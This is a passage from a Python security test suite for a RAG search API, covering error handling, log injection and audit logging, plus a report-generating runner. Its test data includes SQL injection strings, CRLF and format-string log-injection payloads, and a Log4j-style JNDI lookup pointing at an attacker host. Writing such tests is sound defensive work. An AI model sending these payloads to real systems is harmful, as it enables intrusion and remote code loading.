            {"json": {"query": "'; SELECT * FROM pg_tables; --"}},
            # Unicode errors
            {"json": {"query": "\uD800"}},  # Invalid Unicode
        ]
        
        for trigger in error_triggers:
            try:
                if "content" in trigger:
                    response = await client.post(
                        f"{self.config.api_prefix}{self.config.search_endpoint}/hybrid",
                        content=trigger["content"],
                        headers={"Content-Type": trigger.get("content_type", "application/json")}
                    )
                else:
                    response = await client.post(
                        f"{self.config.api_prefix}{self.config.search_endpoint}/hybrid",
                        json=trigger["json"]
                    )
                
                # Check response for sensitive patterns
                response_text = response.text.lower()
                leaked_info = []
                
                for pattern in self.SENSITIVE_PATTERNS:
                    import re
                    if re.search(pattern.lower(), response_text):
                        leaked_info.append(pattern)
                
                if leaked_info:
                    results["failed"] += 1
                    self.log_test_result(
                        "sensitive_info_in_error",
                        False,
                        {"patterns_found": leaked_info}
                    )
                else:
                    results["passed"] += 1
                    
            except Exception as e:
                results["failed"] += 1
                logger.error(f"Error handling test error: {e}")
        
        return results

    async def test_consistent_error_format(self, client: AsyncClient) -> Dict[str, Any]:
        """Test that error responses have consistent format"""
        results = {"passed": 0, "failed": 0}
        
        error_codes_to_test = [400, 401, 403, 404, 422, 429, 500]
        expected_fields = ["detail"]  # FastAPI default
        
        # Trigger different error codes
        test_cases = [
            # 400 - Bad Request
            ({"json": {"invalid": "field"}}, 400),
            # 401 - Unauthorized
            ({"headers": {"Authorization": "Bearer invalid"}}, 401),
            # 404 - Not Found
            ({"endpoint": "/nonexistent"}, 404),
            # 422 - Validation Error
            ({"json": {"query": 123}}, 422),  # Wrong type
        ]
        
        for test_case in test_cases:
            try:
                config = test_case[0]
                expected_code = test_case[1]
                
                endpoint = config.get("endpoint", f"{self.config.api_prefix}{self.config.search_endpoint}/hybrid")
                response = await client.post(
                    endpoint,
                    json=config.get("json", {"query": "test"}),
                    headers=config.get("headers", {})
                )
                
                # Check response format
                try:
                    error_body = response.json()
                    
                    # Verify consistent structure
                    if isinstance(error_body, dict):
                        results["passed"] += 1
                    else:
                        results["failed"] += 1
                        
                except json.JSONDecodeError:
                    results["failed"] += 1
                    self.log_test_result(
                        "error_format",
                        False,
                        {"message": "Error response not valid JSON", "status": response.status_code}
                    )
                    
            except Exception as e:
                results["failed"] += 1
                logger.error(f"Error format test error: {e}")
        
        return results

    async def test_no_stack_traces(self, client: AsyncClient) -> Dict[str, Any]:
        """Test that stack traces are not exposed"""
        results = {"passed": 0, "failed": 0}
        
        # Requests designed to cause server errors
        crash_attempts = [
            {"query": None},
            {"query": {"nested": {"very": {"deep": "object" * 100}}}},
            {"query": "test", "limit": 999999999999},
            {"query": "test", "page": -1},
        ]
        
        for payload in crash_attempts:
            try:
                response = await client.post(
                    f"{self.config.api_prefix}{self.config.search_endpoint}/hybrid",
                    json=payload
                )
                
                response_text = response.text
                
                # Check for stack trace indicators
                stack_trace_indicators = [
                    "Traceback (most recent call last)",
                    "File \"",
                    "line ",
                    ".py\",",
                    "at 0x",
                    "raise ",
                    "Exception:",
                    "Error:",
                ]
                
                has_stack_trace = any(
                    indicator in response_text
                    for indicator in stack_trace_indicators
                )
                
                if has_stack_trace and response.status_code >= 500:
                    results["failed"] += 1
                    self.log_test_result(
                        "stack_trace_exposure",
                        False,
                        {"message": "Stack trace exposed in error response"}
                    )
                else:
                    results["passed"] += 1
                    
            except Exception as e:
                results["failed"] += 1
                logger.error(f"Stack trace test error: {e}")
        
        return results


# =============================================================================
# 6. LOGGING AND AUDITING TESTS
# =============================================================================

class TestLoggingAuditing(SecurityTestBase):
    """
    Logging and auditing security tests.
    
    Tests for:
    - Security event logging
    - Authentication attempt logging
    - Failed access attempt logging
    - Audit trail completeness
    - Log injection prevention
    - Sensitive data not logged
    """

    async def test_failed_auth_logged(
        self,
        client: AsyncClient,
        log_path: str = "/var/log/rag/security.log"
    ) -> Dict[str, Any]:
        """Test that failed authentication attempts are logged"""
        results = {"passed": 0, "failed": 0}
        
        # Make failed auth attempts
        test_id = str(uuid.uuid4())[:8]
        
        for i in range(3):
            try:
                await client.post(
                    f"{self.config.api_prefix}/auth/login",
                    json={
                        "email": f"test_audit_{test_id}_{i}@test.com",
                        "password": "wrong_password"
                    }
                )
            except Exception:
                pass
        
        # Note: In a real test, we would check the log file
        # For this test, we verify the endpoint returns appropriate status
        results["passed"] += 1  # Placeholder - actual log verification needs log access
        
        return results

    async def test_log_injection_prevention(self, client: AsyncClient) -> Dict[str, Any]:
        """Test that log injection is prevented"""
        results = {"passed": 0, "failed": 0}
        accepted_statuses = {200, 400, 401, 422, 429}
        
        log_injection_payloads = [
            # CRLF injection
            "test\r\nFAKE LOG ENTRY: Admin login successful",
            "test\nINFO: User escalated to admin",
            "test%0d%0aFAKE_LOG_ENTRY",
            "test%0aFAKE_LOG_ENTRY",
            
            # Format string injection
            "%s%s%s%s%s",
            "%n%n%n%n%n",
            "${jndi:ldap://attacker.com/a}",  # Log4j style
            
            # Unicode control characters
            "test\u2028FAKE LOG",
            "test\u2029FAKE LOG",
        ]
        
        for payload in log_injection_payloads:
            try:
                response = await client.post(
                    f"{self.config.api_prefix}{self.config.search_endpoint}/hybrid",
                    json={"query": payload}
                )
                
                # The request should be handled without crashing
                if response.status_code in accepted_statuses:
                    results["passed"] += 1
                else:
                    results["failed"] += 1
                    
            except Exception as e:
                results["failed"] += 1
                logger.error(f"Log injection test error: {e}")
        
        return results

    async def test_sensitive_data_not_logged(
        self,
        client: AsyncClient,
        log_checker: Optional[callable] = None
    ) -> Dict[str, Any]:
        """Test that sensitive data is not logged"""
        results = {"passed": 0, "failed": 0}
        
        # Make request with sensitive data
        sensitive_marker = f"SENSITIVE_DATA_{uuid.uuid4()}"
        
        try:
            await client.post(
                f"{self.config.api_prefix}/auth/login",
                json={
                    "email": "test@test.com",
                    "password": sensitive_marker
                }
            )
            
            # If log_checker is provided, verify sensitive data is not logged
            if log_checker:
                if log_checker(sensitive_marker):
                    results["failed"] += 1
                    self.log_test_result(
                        "sensitive_data_logging",
                        False,
                        {"message": "Sensitive data found in logs"}
                    )
                else:
                    results["passed"] += 1
            else:
                # Without log checker, we can only verify the request succeeded
                results["passed"] += 1
                
        except Exception as e:
            results["failed"] += 1
            logger.error(f"Sensitive data logging test error: {e}")
        
        return results


# =============================================================================
# TEST RUNNER & REPORTING
# =============================================================================

class SecurityTestRunner:
    """
    Orchestrates all security tests and generates reports.
    """
    
    def __init__(self, config: TestConfig):
        self.config = config
        self.results: Dict[str, Any] = {}
        
    async def run_all_tests(
        self,
        client: AsyncClient,
        test_users: Dict[str, TestUser]
    ) -> Dict[str, Any]:
        """Run all security tests"""
        
        start_time = datetime.utcnow()
        
        # Initialize test classes
        input_validation = TestInputValidation(self.config)
        authentication = TestAuthentication(self.config)
        authorization = TestAuthorization(self.config)
        rate_limiting = TestRateLimiting(self.config)
        error_handling = TestErrorHandling(self.config)
        logging_auditing = TestLoggingAuditing(self.config)
        
        # Run input validation tests
        logger.info("=" * 60)
        logger.info("🔒 RUNNING INPUT VALIDATION TESTS")
        logger.info("=" * 60)
        
        self.results["input_validation"] = {
            "sql_injection": await input_validation.test_sql_injection_prevention(client),
            "xss": await input_validation.test_xss_prevention(client),
            "command_injection": await input_validation.test_command_injection_prevention(client),
            "input_length": await input_validation.test_input_length_limits(client),
            "special_chars": await input_validation.test_special_characters_handling(client),
            "content_type": await input_validation.test_content_type_enforcement(client),
        }
        
        # Run authentication tests
        logger.info("=" * 60)
        logger.info("🔐 RUNNING AUTHENTICATION TESTS")
        logger.info("=" * 60)
        
        self.results["authentication"] = {
            "unauthenticated_access": await authentication.test_unauthenticated_access_denied(client),
            "invalid_token": await authentication.test_invalid_token_rejected(client),
            "jwt_algorithm": await authentication.test_jwt_algorithm_confusion(client),
            "brute_force": await authentication.test_brute_force_protection(client),
            "api_key_validation": await authentication.test_api_key_validation(client),
            "session_fixation": await authentication.test_session_fixation(client),
        }
        
        # Run authorization tests (if tokens available)
        if test_users.get("user") and test_users.get("admin"):
            logger.info("=" * 60)
            logger.info("🛡️ RUNNING AUTHORIZATION TESTS")
            logger.info("=" * 60)
            
            user = test_users["user"]
            admin = test_users["admin"]
            
            self.results["authorization"] = {}
            
            if user.access_token and admin.access_token:
                self.results["authorization"]["rbac"] = await authorization.test_rbac_enforcement(
                    client, user.access_token, admin.access_token
                )
                self.results["authorization"]["privilege_escalation"] = \
                    await authorization.test_privilege_escalation_prevention(
                        client, user.access_token
                    )
        
        # Run rate limiting tests
        logger.info("=" * 60)
        logger.info("⏱️ RUNNING RATE LIMITING TESTS")
        logger.info("=" * 60)
        
        auth_token = test_users.get("user", TestUser(
            id="test", email="test@test.com", password="test",
            role="user", organization_id="test_org"
        )).access_token or "test_token"
        
        self.results["rate_limiting"] = {
            "enforcement": await rate_limiting.test_rate_limit_enforcement(client, auth_token),
            "bypass_attempts": await rate_limiting.test_rate_limit_bypass_attempts(client, auth_token),
            "concurrent": await rate_limiting.test_concurrent_request_limits(client, auth_token),
        }
        
        # Run error handling tests
        logger.info("=" * 60)
        logger.info("⚠️ RUNNING ERROR HANDLING TESTS")
        logger.info("=" * 60)
        
        self.results["error_handling"] = {
            "sensitive_info": await error_handling.test_no_sensitive_info_in_errors(client),
            "consistent_format": await error_handling.test_consistent_error_format(client),
            "stack_traces": await error_handling.test_no_stack_traces(client),
        }
        
        # Run logging/auditing tests
        logger.info("=" * 60)
        logger.info("📝 RUNNING LOGGING & AUDITING TESTS")
        logger.info("=" * 60)
        
        self.results["logging_auditing"] = {
            "failed_auth_logged": await logging_auditing.test_failed_auth_logged(client),
            "log_injection": await logging_auditing.test_log_injection_prevention(client),
            "sensitive_data_logging": await logging_auditing.test_sensitive_data_not_logged(client),
        }
        
        end_time = datetime.utcnow()
        
        # Generate summary
        return self._generate_report(start_time, end_time)
    
    def _generate_report(self, start_time: datetime, end_time: datetime) -> Dict[str, Any]:
        """Generate test report"""
        
        total_passed = 0
        total_failed = 0
        
        for category, tests in self.results.items():
            for test_name, result in tests.items():
                if isinstance(result, dict):
                    total_passed += result.get("passed", 0)
                    total_failed += result.get("failed", 0)
        
        report = {
            "summary": {
                "total_passed": total_passed,
                "total_failed": total_failed,
                "total_tests": total_passed + total_failed,
                "pass_rate": f"{(total_passed / (total_passed + total_failed) * 100):.2f}%" if (total_passed + total_failed) > 0 else "N/A",
                "start_time": start_time.isoformat(),
                "end_time": end_time.isoformat(),
                "duration_seconds": (end_time - start_time).total_seconds()
            },
            "categories": self.results,
            "recommendations": self._generate_recommendations()
        }
        
        return report
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations based on test results"""
        recommendations = []
        
        for category, tests in self.results.items():
            for test_name, result in tests.items():
                if isinstance(result, dict) and result.get("failed", 0) > 0:
                    recommendations.append(
                        f"Review {category}/{test_name}: {result.get('failed')} test(s) failed"
                    )
        
        return recommendations


# =============================================================================
# PYTEST FIXTURES AND TEST FUNCTIONS
# =============================================================================

@pytest.fixture
def test_config():
    """Pytest fixture for test configuration"""
    return TestConfig()


@pytest.fixture
async def async_client(test_config):
    """Pytest fixture for async HTTP client"""
    async with AsyncClient(base_url=test_config.base_url) as client:
        yield client


@pytest.fixture
def test_users():
    """Pytest fixture for test users"""
    return {
        "user": TestUser(
            id="test-user-1",
            email="user@test.com",
            password="UserPassword123!",
            role="user",
            organization_id="org-1"
        ),
        "admin": TestUser(
            id="test-admin-1",
            email="admin@test.com",
            password="AdminPassword123!",
            role="admin",
            organization_id="org-1"
        ),
        "other_org_user": TestUser(
            id="test-user-2",
            email="other@test.com",
            password="OtherPassword123!",
            role="user",
            organization_id="org-2"
        )
    }


@pytest.mark.asyncio
async def test_sql_injection_prevention(async_client, test_config):
    """Test SQL injection prevention"""
    test_class = TestInputValidation(test_config)
    result = await test_class.test_sql_injection_prevention(async_client)
    assert result["failed"] == 0, f"SQL injection tests failed: {result}"


@pytest.mark.asyncio
async def test_xss_prevention(async_client, test_config):
    """Test XSS prevention"""
    test_class = TestInputValidation(test_config)
    result = await test_class.test_xss_prevention(async_client)
    assert result["failed"] == 0, f"XSS prevention tests failed: {result}"


@pytest.mark.asyncio
async def test_authentication_required(async_client, test_config):
    """Test that authentication is required"""
    test_class = TestAuthentication(test_config)
    result = await test_class.test_unauthenticated_access_denied(async_client)
    assert result["failed"] == 0, f"Authentication tests failed: {result}"


@pytest.mark.asyncio
async def test_invalid_tokens_rejected(async_client, test_config):
    """Test that invalid tokens are rejected"""
    test_class = TestAuthentication(test_config)
    result = await test_class.test_invalid_token_rejected(async_client)
    assert result["failed"] == 0, f"Token validation tests failed: {result}"


@pytest.mark.asyncio
async def test_error_handling_security(async_client, test_config):
    """Test error handling security"""
    test_class = TestErrorHandling(test_config)
    
    sensitive_result = await test_class.test_no_sensitive_info_in_errors(async_client)
    stack_result = await test_class.test_no_stack_traces(async_client)
    
    assert sensitive_result["failed"] == 0, f"Sensitive info in errors: {sensitive_result}"
    assert stack_result["failed"] == 0, f"Stack traces exposed: {stack_result}"


@pytest.mark.asyncio
async def test_log_injection_prevention(async_client, test_config):
    """Test log injection prevention"""
    test_class = TestLoggingAuditing(test_config)
    result = await test_class.test_log_injection_prevention(async_client)
    assert result["failed"] == 0, f"Log injection tests failed: {result}"


# =============================================================================
# MAIN EXECUTION
# =============================================================================

async def main():
    """Main function to run all security tests"""
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s"
    )
    
    config = TestConfig()
    runner = SecurityTestRunner(config)
    
    test_users = {
        "user": TestUser(
            id="test-user-1",
            email="user@test.com",
            password="UserPassword123!",
            role="user",
            organization_id="org-1"
        ),
        "admin": TestUser(
            id="test-admin-1",
            email="admin@test.com",
            password="AdminPassword123!",
            role="admin",
            organization_id="org-1"
        )
    }
    
    async with AsyncClient(base_url=config.base_url, timeout=config.timeout) as client:
        print("\n" + "=" * 80)
        print("🔒 RAG SEARCH ENDPOINT SECURITY TEST SUITE")
        print("=" * 80 + "\n")
        
        report = await runner.run_all_tests(client, test_users)
        
        print("\n" + "=" * 80)
        print("📊 TEST SUMMARY")
        print("=" * 80)
        print(f"Total Tests: {report['summary']['total_tests']}")
        print(f"Passed: {report['summary']['total_passed']}")
        print(f"Failed: {report['summary']['total_failed']}")
        print(f"Pass Rate: {report['summary']['pass_rate']}")
        print(f"Duration: {report['summary']['duration_seconds']:.2f} seconds")
        
        if report['recommendations']:
            print("\n📋 RECOMMENDATIONS:")
            for rec in report['recommendations']:
                print(f"  • {rec}")
        
        print("\n" + "=" * 80)
        
        # Save report
        report_path = "/home/clawdbot/clawd/dev/rag/backend/tests/security/security_test_report.json"
        with open(report_path, "w") as f:
            json.dump(report, f, indent=2, default=str)
        print(f"📄 Full report saved to: {report_path}")
        
        return report


if __name__ == "__main__":
    asyncio.run(main())
